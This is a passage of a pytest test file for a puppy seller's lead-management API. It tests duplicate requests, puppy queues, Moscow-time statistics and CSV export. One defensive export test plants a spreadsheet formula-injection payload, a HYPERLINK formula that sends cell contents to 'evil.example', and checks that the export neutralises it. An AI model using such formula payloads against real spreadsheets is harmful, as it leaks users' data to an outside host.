    assert client.post(f"{A}/leads/999999/comments", headers=manager_h, json={"text": "ok"}).status_code == 404


# ---------------------------------------------------------------- manual requests
def test_manual_request_cannot_pretend_to_come_from_the_site(client, admin_h, db):
    body = {"origin": "site_form", "name": "Ирина", "phone": phone(1)}
    r = client.post(f"{A}/leads", headers=admin_h, json=body)
    assert r.status_code == 422 and "origin" in r.json()["error"]["fields"]
    r = client.post(f"{A}/leads", headers=admin_h, json={**body, "origin": "phone", "phone": "12345"})
    assert r.status_code == 422 and "phone" in r.json()["error"]["fields"]
    assert sql(db, "SELECT count(*) AS n FROM leads")[0]["n"] == 0


def test_manual_request_joins_the_open_request_of_the_same_breed(client, admin_h, admin_user, make_lead, db):
    site = new_lead(make_lead, db, phone="+7 (901) 111-22-33", breed="maltipu")
    r = client.post(f"{A}/leads", headers=admin_h, json={
        "origin": "whatsapp", "name": "Анна", "phone": "8 901 111 22 33", "breed": "maltipu", "kind": "video_call"})
    assert r.status_code == 201, r.text
    dup = r.json()
    assert (dup["status"], dup["parent_id"], dup["origin"]) == ("duplicate", site, "whatsapp")
    assert dup["assignee"]["id"] == admin_user.id and dup["first_response_at"] is not None
    parent = card(client, admin_h, site)
    assert [c["id"] for c in parent["children"]] == [dup["id"]]
    assert parent["history"][-1]["action"] == "repeat" and parent["history"][-1]["actor_label"] == "Анна"
    # a manager may keep it separate
    r = client.post(f"{A}/leads", headers=admin_h, json={
        "origin": "phone", "name": "Анна", "phone": "+79011112233", "breed": "maltipu", "attach_to_open": False})
    assert r.status_code == 201 and (r.json()["status"], r.json()["parent_id"]) == ("new", None)
    # another breed is another request
    r = client.post(f"{A}/leads", headers=admin_h, json={
        "origin": "avito", "name": "Анна", "phone": "+79011112233", "breed": "border-kolli"})
    assert r.status_code == 201 and (r.json()["status"], r.json()["parent_id"]) == ("new", None)
    assert r.json()["breed"]["key"] == "kolli"
    contacts = sql(db, "SELECT count(DISTINCT contact_id) AS n, count(*) AS total FROM leads")[0]
    assert (contacts["n"], contacts["total"]) == (1, 4)


def test_manual_request_with_unknown_assignee_is_a_422(admin_h, db):
    from fastapi.testclient import TestClient
    from app.main import app
    with TestClient(app, client=("203.0.113.10", 50000), headers={"Origin": ORIGIN},
                    raise_server_exceptions=False) as c:
        r = c.post(f"{A}/leads", headers=admin_h, json={"origin": "phone", "name": "Ирина", "phone": phone(1),
                                                        "assignee_id": 987654})
    assert r.status_code == 422, r.text
    assert "assignee_id" in r.json()["error"]["fields"]


# ---------------------------------------------------------------- puppies
def test_puppies_counters_and_catalog_mismatch(client, admin_h, make_lead, db):
    sold = new_lead(make_lead, db, phone=phone(1), kind="puppy", puppy=PUP_MALTIPU)
    new_lead(make_lead, db, phone=phone(2), kind="puppy", puppy=PUP_MALTIPU)
    new_lead(make_lead, db, phone=phone(3), kind="puppy", puppy=PUP_MALTIPU_2)
    assert patch(client, admin_h, sold, version=1, status="won", sale_amount="150000").status_code == 200
    r = client.get(f"{A}/puppies", headers=admin_h, params={"breed": "maltipu"})
    assert r.status_code == 200, r.text
    rows = {p["slug"]: p for p in r.json()}
    assert len(rows) == 15 and all(p["breed"]["key"] == "maltipu" for p in rows.values())
    p1, p2 = rows[PUP_MALTIPU], rows[PUP_MALTIPU_2]
    assert (p1["leads_total"], p1["leads_open"], p1["leads_by_status"]) == (2, 1, {"won": 1, "new": 1})
    assert p1["status"] == "available" and p1["catalog_mismatch"] is True   # sold here, still «available» on site
    assert (p2["leads_total"], p2["leads_open"], p2["catalog_mismatch"]) == (1, 1, False)
    assert sum(p["catalog_mismatch"] for p in rows.values()) == 1
    by_key = client.get(f"{A}/puppies", headers=admin_h, params={"breed": "francuzskij-buldog"}).json()
    assert by_key and all(p["breed"]["key"] == "buldog" for p in by_key)
    assert len(client.get(f"{A}/puppies", headers=admin_h).json()) == 60


def test_puppy_queue_is_in_order_of_requests(client, admin_h, make_lead, db):
    now = dt.datetime.now(UTC)
    first, second, third = (new_lead(make_lead, db, phone=phone(i), kind="puppy", puppy=PUP_MALTIPU)
                            for i in range(3))
    new_lead(make_lead, db, phone=phone(5), kind="puppy", puppy=PUP_MALTIPU_2)        # another puppy
    set_lead(db, first, created_at=now - dt.timedelta(days=2))
    set_lead(db, second, created_at=now - dt.timedelta(days=1))
    set_lead(db, third, created_at=now - dt.timedelta(days=3))
    r = client.get(f"{A}/puppies/{PUP_MALTIPU}/leads", headers=admin_h)
    assert r.status_code == 200, r.text
    assert [x["id"] for x in r.json()] == [third, first, second]
    assert client.get(f"{A}/puppies/no-such-puppy/leads", headers=admin_h).status_code == 404


# ---------------------------------------------------------------- stats
def test_stats_by_moscow_days_breeds_and_response_minutes(client, admin_h, make_lead, db):
    m = new_lead(make_lead, db, phone=phone(1), breed="maltipu")
    b = new_lead(make_lead, db, phone=phone(2), breed="buldog")
    g = new_lead(make_lead, db, phone=phone(3), breed="undecided")
    spam = new_lead(make_lead, db, phone=phone(4), breed="maltipu")
    child = new_lead(make_lead, db, phone=phone(1), breed="maltipu", kind="consult")
    t_m = dt.datetime(2026, 3, 10, 23, 30, tzinfo=UTC)          # Moscow: 11 March 02:30
    t_b = dt.datetime(2026, 3, 11, 10, 0, tzinfo=UTC)
    set_lead(db, m, created_at=t_m, first_response_at=t_m + dt.timedelta(minutes=10))
    set_lead(db, b, created_at=t_b, first_response_at=t_b + dt.timedelta(minutes=30), status="won",
             sale_amount=90000)
    set_lead(db, g, created_at=dt.datetime(2026, 3, 12, 8, 0, tzinfo=UTC))
    set_lead(db, spam, created_at=t_b, status="spam", spam_reason="manual")
    set_lead(db, child, created_at=t_b)
    r = client.get(f"{A}/stats", headers=admin_h, params={"from": "2026-03-11", "to": "2026-03-12"})
    assert r.status_code == 200, r.text
    s = r.json()
    assert s["period"] == {"from": "2026-03-11", "to": "2026-03-12", "timezone": "Europe/Moscow"}
    assert s["totals"] == {"leads": 3, "won": 1, "repeat_requests": 1, "spam": 1}
    assert s["by_day"] == [{"date": "2026-03-11", "count": 2}, {"date": "2026-03-12", "count": 1}]
    by_breed = {x["breed"]: (x["count"], x["won"], x["revenue"]) for x in s["by_breed"]}
    assert by_breed == {"maltipu": (1, 0, 0.0), "buldog": (1, 1, 90000.0), "general": (1, 0, 0.0)}
    resp = s["response"]
    assert (float(resp["median_minutes"]), float(resp["p90_minutes"]), resp["without_response"]) == (20.0, 28.0, 1)
    # the 23:30 UTC request is not on 10 March in Moscow
    s10 = client.get(f"{A}/stats", headers=admin_h, params={"from": "2026-03-10", "to": "2026-03-10"}).json()
    assert s10["totals"]["leads"] == 0 and s10["by_day"] == []
    only_m = client.get(f"{A}/stats", headers=admin_h,
                        params={"from": "2026-03-11", "to": "2026-03-12", "breed": "maltipu"}).json()
    assert only_m["totals"]["leads"] == 1
    r = client.get(f"{A}/stats", headers=admin_h, params={"from": "2026-03-12", "to": "2026-03-11"})
    assert r.status_code == 422


def test_stats_response_minutes_are_json_numbers(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db)
    t = dt.datetime.now(UTC) - dt.timedelta(hours=1)
    set_lead(db, lead, created_at=t, first_response_at=t + dt.timedelta(minutes=12))
    resp = client.get(f"{A}/stats", headers=admin_h).json()["response"]
    assert float(resp["median_minutes"]) == 12.0
    assert isinstance(resp["median_minutes"], (int, float)) and isinstance(resp["p90_minutes"], (int, float))


# ---------------------------------------------------------------- meta
def test_meta_has_labels_for_every_status_kind_and_breed(client, manager_h):
    from app.enums import LeadKind, LeadStatus, Origin
    r = client.get(f"{A}/meta", headers=manager_h)
    assert r.status_code == 200, r.text
    m = r.json()
    assert [s["value"] for s in m["statuses"]] == [s.value for s in LeadStatus]
    assert all(s["label"] and s["color"].startswith("#") for s in m["statuses"])
    closed = {s["value"] for s in m["statuses"] if s["is_closed"]}
    assert closed == {"won", "lost", "duplicate", "spam"}
    assert {k["value"] for k in m["kinds"]} == {k.value for k in LeadKind} and all(k["label"] for k in m["kinds"])
    assert {o["value"] for o in m["origins"]} == {o.value for o in Origin}
    assert [b["key"] for b in m["breeds"]] == ["maltipu", "buldog", "pudel", "kolli", "general"]
    assert m["breeds"][-1] == {"id": None, "key": "general", "slug": None, "name": "Без породы", "is_active": True,
                               "view": "leads_general"}
    assert m["timezone"] == "Europe/Moscow" and m["link_site_activity"] is True
    assert {u["name"] for u in m["managers"]} == {"Олег"}


# ---------------------------------------------------------------- CSV export
def test_export_csv_for_excel_is_safe_and_audited(client, admin_h, manager_h, admin_user, make_lead, db):
    evil = '=HYPERLINK("http://evil.example/?x="&A1,"Фото щенка")'
    bad = new_lead(make_lead, db, phone=phone(1), name=evil, breed="maltipu")
    ok = new_lead(make_lead, db, phone=phone(2), name="Анна", breed="francuzskij-buldog")
    set_lead(db, bad, created_at=dt.datetime(2026, 3, 10, 23, 30, tzinfo=UTC))
    set_lead(db, ok, note="-1+2", status="in_progress")

    r = client.get(f"{A}/export/leads.csv", headers=manager_h)
    assert r.status_code == 403
    r = client.get(f"{A}/export/leads.csv", headers=admin_h)
    assert r.status_code == 200, r.text
    assert r.headers["content-type"].startswith("text/csv")
    assert "attachment" in r.headers["content-disposition"] and r.headers["cache-control"] == "no-store"
    assert r.content.startswith(b"\xef\xbb\xbf")
    rows = list(csv.reader(io.StringIO(r.content.decode("utf-8-sig")), delimiter=";"))
    head = rows[0]
    assert head[:5] == ["№", "Дата", "Статус", "Порода", "Что нужно"]
    assert {"Имя", "Телефон", "Причина отказа", "Пометка"} <= set(head)
    by_id = {row[0]: dict(zip(head, row)) for row in rows[1:]}
    assert set(by_id) == {str(bad), str(ok)}
    assert by_id[str(bad)]["Имя"] == "'" + evil                     # never a live formula in Excel
    assert by_id[str(bad)]["Дата"] == "11.03.2026 02:30"            # Moscow time
    assert (by_id[str(bad)]["Статус"], by_id[str(bad)]["Порода"]) == ("Новая", "Мальтипу")
    assert by_id[str(ok)]["Пометка"] == "'-1+2"
    assert by_id[str(ok)]["Статус"] == "В работе"
    assert by_id[str(ok)]["Телефон"].endswith("(902) 555-02-02")
    for row in rows[1:]:
        assert not any(cell[:1] in ("=", "+", "-", "@") for cell in row), row

    r = client.get(f"{A}/export/leads.csv", headers=admin_h, params={"breed": "buldog"})
    assert [row[0] for row in csv.reader(io.StringIO(r.content.decode("utf-8-sig")), delimiter=";")][1:] == [str(ok)]
    audit = sql(db, "SELECT actor_id, actor_label, details FROM audit_log WHERE action = 'export' ORDER BY id")
    assert [(a["actor_id"], a["actor_label"], a["details"]["rows"]) for a in audit] == \
        [(admin_user.id, "Анна", 2), (admin_user.id, "Анна", 1)]
    assert audit[1]["details"]["filters"]["breed"] == "['buldog']"
